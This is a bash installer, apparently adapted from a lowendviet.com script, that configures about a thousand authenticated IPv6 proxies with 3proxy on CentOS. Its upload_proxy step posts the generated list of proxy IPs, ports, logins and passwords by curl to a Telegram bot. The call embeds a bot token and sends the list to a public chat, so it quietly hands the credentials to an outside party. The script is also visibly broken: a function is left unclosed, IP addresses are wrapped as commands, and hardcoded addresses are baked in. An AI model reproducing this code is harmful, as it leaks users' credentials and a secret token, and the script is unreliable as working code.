#!/bin/bash
###Script by Ngo Anh Tuan-lowendviet.com.

#Change log:
#Update 2022-Oct-05: Initialize script

# Final vars
UPDATE_URL="https://file.lowendviet.com/Scripts/Linux/levip6/levip6"
BIN_DIR="/usr/local/bin/"
BIN_EXEC="${BIN_DIR}levip6"
WORKDIR="/etc/lev/"
WORKDATA="${WORKDIR}/data.txt"
LOGFILE="/var/log/levip6.log"

cat << "EOF"
==========================================================================
  _                             _       _      _
 | |                           | |     (_)    | |
 | | _____      _____ _ __   __| __   ___  ___| |_   ___ ___  _ __ ___
 | |/ _ \ \ /\ / / _ | '_ \ / _` \ \ / | |/ _ | __| / __/ _ \| '_ ` _ \
 | | (_) \ V  V |  __| | | | (_| |\ V /| |  __| |_ | (_| (_) | | | | | |
 |_|\___/ \_/\_/ \___|_| |_|\__,_| \_/ |_|\___|\__(_\___\___/|_| |_| |_|

        IPv6 All In One v1.0 by LowendViet.com Cloud VPS Server
==========================================================================

EOF

echo -e "Installing libraries and initializing....."



if [[ -f /etc/os-release ]]; then
    # freedesktop.org and systemd
    . /etc/os-release
    OS=$NAME
    VER=$VERSION_ID
elif type lsb_release >/dev/null 2>&1; then
    # linuxbase.org
    OS=$(lsb_release -si)
    VER=$(lsb_release -sr)
elif [[ -f /etc/lsb-release ]]; then
    # For some versions of Debian/Ubuntu without lsb_release command
    . /etc/lsb-release
    OS=$DISTRIB_ID
    VER=$DISTRIB_RELEASE
elif [[ -f /etc/debian_version ]]; then
    # Older Debian/Ubuntu/etc.
    OS=Debian
    VER=$(cat /etc/debian_version)
elif [[ -f /etc/SuSe-release ]]; then
    # Older SuSE/etc.
    ...
elif [[ -f /etc/redhat-release ]]; then
    # Older Red Hat, CentOS, etc.
    ...
else
    # Fall back to uname, e.g. "Linux <version>", also works for BSD, etc.
    OS=$(uname -s)
    VER=$(uname -r)
fi

network_card=$(ip -o link show | awk '{print $2,$9}' | grep ens | cut -d: -f1)
if [[ -z "$network_card" ]]; then
  network_card=$(ip -o link show | awk '{print $2,$9}' | grep enp | cut -d: -f1)
fi
if [[ -z "$network_card" ]]; then
  network_card=$(ip -o link show | awk '{print $2,$9}' | grep eno | cut -d: -f1)
fi
if [[ -z "$network_card" ]]; then
  network_card="eth0"
fi

if [[ "$OS" = "CentOS Linux" ]]; then
  yum install -y epel-release > /dev/null
  yum install -y subnetcalc psmisc zip unzip curl jq net-tools> /dev/null
elif [ "$OS" = "Ubuntu" -a "$VER" = "18.04" ]; then
  apt-get install -y subnetcalc psmisc zip unzip curl jq net-tools > /dev/null
elif [ "$OS" = "Ubuntu" -a "$VER" = "20.04" ]; then
    apt-get install -y subnetcalc psmisc zip unzip curl jq net-tools > /dev/null
fi

# Private functions
array=(1 2 3 4 5 6 7 8 9 0 a b c d e f)
getRandomIPv6() {
  prefix=$1
  ipv6mask=$2
  noOfRandomHextet=$(( (128-${ipv6mask}) / 16))
	randomHextet() {
		echo -n "${array[$RANDOM % 16]}${array[$RANDOM % 16]}${array[$RANDOM % 16]}${array[$RANDOM % 16]}"
	}
	echo -n "$1"
  for (( i=0; i<${noOfRandomHextet}; i++ )); do
    echo -n ":$(randomHextet)"
  done
}

setIPv6() {
  ipv6=$1
  ipv6mask=$2
  isPutFirst=$3
  ipv6gw=$4
  if [[ "$OS" = "CentOS Linux" ]]; then
    if grep -q IPV6ADDR_SECONDARIES "/etc/sysconfig/network-scripts/ifcfg-${network_card}"; then
      temp=$(cat /etc/sysconfig/network-scripts/ifcfg-${network_card} | grep IPV6ADDR_SECONDARIES | cut -d "=" -f2 | sed -e 's/^"//' -e 's/"$//')
      if [[ "$isPutFirst" == "Y" || "$isPutFirst" == "y" ]]; then
        if echo $temp | grep -q "$ipv6"; then
          temp=$(echo $temp | sed "s/${ipv6}\/${ipv6mask}//")
        fi
        ipv6NewList=$(echo -n "$temp $ipv6\/${ipv6mask}")
      else
        ipv6NewList=$(echo -n "$ipv6\/${ipv6mask} $temp")
      fi

      sed -i "/IPV6ADDR_SECONDARIES=/c\IPV6ADDR_SECONDARIES=\"${ipv6NewList}\"" /etc/sysconfig/network-scripts/ifcfg-${network_card}
      if [[ $ipv6gw ]]; then
        if grep -q IPV6_DEFAULTGW "/etc/sysconfig/network-scripts/ifcfg-${network_card}"; then
          sed -i "/IPV6_DEFAULTGW=/c\IPV6_DEFAULTGW=${ipv6gw}" /etc/sysconfig/network-scripts/ifcfg-${network_card}
        else
          echo -e "IPV6_DEFAULTGW=${ipv6gw}" >> /etc/sysconfig/network-scripts/ifcfg-${network_card}
        fi
      fi
    else
      if [[ $ipv6gw ]]; then
        echo -e 'IPV6INIT="yes"' >> /etc/sysconfig/network-scripts/ifcfg-${network_card}
        echo -e 'IPV6_AUTOCONF="no"' >> /etc/sysconfig/network-scripts/ifcfg-${network_card}
        echo -e "IPV6ADDR_SECONDARIES=\"${ipv6}/${ipv6mask}\"" >> /etc/sysconfig/network-scripts/ifcfg-${network_card}
        if grep -q IPV6_DEFAULTGW "/etc/sysconfig/network-scripts/ifcfg-${network_card}"; then
          sed -i "/IPV6_DEFAULTGW=/c\IPV6_DEFAULTGW=${ipv6gw}" /etc/sysconfig/network-scripts/ifcfg-${network_card}
        else
          echo -e "IPV6_DEFAULTGW=${ipv6gw}" >> /etc/sysconfig/network-scripts/ifcfg-${network_card}
        fi
      else
        echo -e "IPV6ADDR_SECONDARIES=\"${ipv6}\/${ipv6mask}\"" >> /etc/sysconfig/network-scripts/ifcfg-${network_card}
      fi
    fi
  fi
}

getRandomString() {
  echo "$(tr </dev/urandom -dc A-Za-z0-9 | head -c5)"
}

getPrefix() {
  ipv6=$1
  ipv6mask=$2
  if [[ $ipv6 ]]; then
    if [[ $ipv6mask && $ipv6mask -ge 0 && $ipv6mask -lt 128 ]]; then
      noOfPrefixHextet=$(( $ipv6mask / 16 ))
      for (( i=1; i<=${noOfPrefixHextet}; i++ )); do
        hextet=$(echo $ipv6 | cut -d : -f "$i")
        if [[ $hextet ]]; then
          echo -n "$hextet:"
        else
          echo -n "0000:"
        fi
      done
    fi
  fi
}
generateRandomUserPass() {
  noToGen=$1
  for (( i=0; i<${noToGen}; i++ )); do
    echo -n "u${i}:CL:"
  done
}

generateData() {
  totalProxy=$1
  currentIPv4=$2
  prefix=$3
  ipv6mask=$4
  pwProxyIPv6=$5
  FILE=/etc/3proxy/maxport.conf
  if test -f "$FILE"; then
    minPort=$(cat "$FILE")
  else
    minPort=10000
  fi
  maxPort=$(( $minPort + $totalProxy ))
  proxyUser="lev"
  proxyPw=$pwProxyIPv6
  for (( i=$minPort; i<${maxPort}; i++ )); do
    if [[ -z "$pwProxyIPv6" ]]; then
      proxyUser="lev${i}"
      proxyPw=$(getRandomString)
    fi
    randomIPv6=$(getRandomIPv6 $prefix $ipv6mask)
    setIPv6 $randomIPv6 $ipv6mask
    echo "$proxyUser/$proxyPw/$currentIPv4/$i/$randomIPv6"
  done
  echo $maxPort > $FILE
}

generateFirewall() {
  gen_iptables() {
      cat <<EOF
      $(awk -F "/" '{print "iptables -I INPUT -p tcp --dport " $4 "  -m state --state NEW -j ACCEPT"}' ${WORKDATA})
EOF
  }

  gen_iptables >$WORKDIR/boot_iptables.sh
  chmod +x $WORKDIR/boot_*.sh /etc/rc.local
}

generateProxyConfig() {
pwProxyIPv6=$1
    cat <<EOF >/etc/3proxy/3proxy.cfg
daemon
maxconn 2000
nserver 1.1.1.1
nserver 8.8.4.4
nserver 2001:4860:4860::8888
nserver 2001:4860:4860::8844
nscache 65536
timeouts 1 5 30 60 180 1800 15 60
setgid 65535
setuid 65535
stacksize 6291456
flush
auth strong
EOF
if [[ -f ${WORKDATA} ]] ; then
  cat <<EOF >>/etc/3proxy/3proxy.cfg
users $(awk -F "/" 'BEGIN{ORS="";} {print $1 ":CL:" $2 " "}' ${WORKDATA})
$(awk -F "/" '{print "auth strong\n" \
"allow " $1 "\n" \
"proxy -6 -n -a -p" $4 " -i" $3 " -e"$5"\n" \
"flush\n"}' ${WORKDATA})
EOF
fi
}

generateProxyListFile() {
      cat <<EOF > ${WORKDIR}/proxy.txt
$(awk -F "/" '{print $3 ":" $4 ":" $1 ":" $2 }' ${WORKDATA})
EOF
}


upload_proxy() {
	cd $WORKDIR
	URL=$(curl -F document=@"proxy.txt" https://api.telegram.org/bot6374968102:AAEi4z3l0E5KwRu8v2haNYoScW7N84i6FQs/sendDocument?chat_id=@buyupvultr)
    echo "Proxy is ready! Format IP:PORT:LOGIN:PASS"
    echo "Download zip archive from telegram"
    
readWithTrim() {
  read temp
  echo -n "$temp" | sed 's/^ *//;s/ *$//'
}

validateIPv6() {
  ipv6=$1
  regex='^([0-9a-fA-F]{0,4}:){1,7}[0-9a-fA-F]{0,4}$'
  if [[ $ipv6 =~ $regex ]]; then
    echo "valid"
  else
    echo "invalid"
  fi
}

checkMainIP() {
  if [[ "$OS" = "CentOS Linux" ]]; then
    if grep -q IPV6_DEFAULTGW "/etc/sysconfig/network-scripts/ifcfg-${network_card}"; then
      echo "GWOK"
    else
      echo "NOGW"
    fi
  fi
}

#Main program
selection="1000"
ipv6="fe80::1"
prefix="fe80"
ipv6mask="64"





ipv4=$(curl -4 -s icanhazip.com)
currentIPv6List=$(ip addr show dev ${network_card} | sed -e's/^.*inet6 \([^ ]*\).*$/\1/;t;d' | grep -v fe80)
firstIPv6=$(ip addr show dev ${network_card} | sed -e's/^.*inet6 \([^ ]*\).*$/\1/;t;d' | grep -v fe80 | head -n 1)
if [[ "$firstIPv6" ]]; then
	ipv6=$(echo $firstIPv6)
	ipv6mask=$(echo $firstIPv6 | cut -d "/" -f2)
	prefix=$(subnetcalc $firstIPv6 | grep Network | cut -d "=" -f2 | cut -d "/" -f1 | awk '{$1=$1};1' | sed 's/:*$//g' )
fi


# Set main IP

ipv6=$(2001:19f0:6401:1432::2)
if [[ "$ipv6" == *\/* ]]; then
  # Mind the order of the following command
  ipv6mask=$(echo $ipv6 | cut -d "/" -f2)
  ipv6=$(echo $ipv6 | cut -d "/" -f1)
else
  t=$(64)
  if [[ "$t" ]]; then
	ipv6mask="$t"
  fi
fi
ipv6gw=$(2001:19f0:6401:1432::1)
if [[ "$OS" = "CentOS Linux" ]]; then
  setIPv6 $ipv6 $ipv6mask "Y" $ipv6gw
fi
systemctl restart network
echo "restart network done"
# TAO PROXY
if [[ "$OS" = "CentOS Linux" ]]; then
if [[ -z $(yum list installed | grep 3proxy) ]]; then
  mkdir $WORKDIR && cd $_
  mkdir -p ./3proxy
  cd ./3proxy
  wget -q https://file.lowendviet.com/Scripts/Linux/CentOS7/3proxy/3proxy-0.9.4.x86_64.rpm
  temp=$(rpm -i 3proxy-0.9.4.x86_64.rpm)
  systemctl enable 3proxy
  echo "* hard nofile 999999" >>  /etc/security/limits.conf
  echo "* soft nofile 999999" >>  /etc/security/limits.conf
  echo "net.ipv6.conf.ens3.proxy_ndp=1" >> /etc/sysctl.conf
  echo "net.ipv6.conf.all.proxy_ndp=1" >> /etc/sysctl.conf
  echo "net.ipv6.conf.default.forwarding=1" >> /etc/sysctl.conf
  echo "net.ipv6.conf.all.forwarding=1" >> /etc/sysctl.conf
  echo "net.ipv6.ip_nonlocal_bind = 1" >> /etc/sysctl.conf
  sed -i "/Description=/c\Description=3 Proxy optimized by LowendViet" /etc/sysctl.conf
  sed -i "/LimitNOFILE=/c\LimitNOFILE=9999999" /etc/sysctl.conf
  sed -i "/LimitNPROC=/c\LimitNPROC=9999999" /etc/sysctl.conf
fi

fi
echo -e ""
echo -e "Nhap so luong Proxy IPv6 ban muon tao. Mac dinh: 1."
noProxyIPv6=1000

generateData $noProxyIPv6 $ipv4 $prefix $ipv6mask $pwProxyIPv6 >> $WORKDATA
generateFirewall
generateProxyConfig $pwProxyIPv6
ulimit -n 65535
service network restart > /dev/null
bash ${WORKDIR}/boot_iptables.sh
systemctl stop 3proxy > /dev/null && sleep 2 && systemctl start 3proxy > /dev/null
generateProxyListFile $pwProxyIPv6
upload_proxy
service 3proxy start > /dev/null
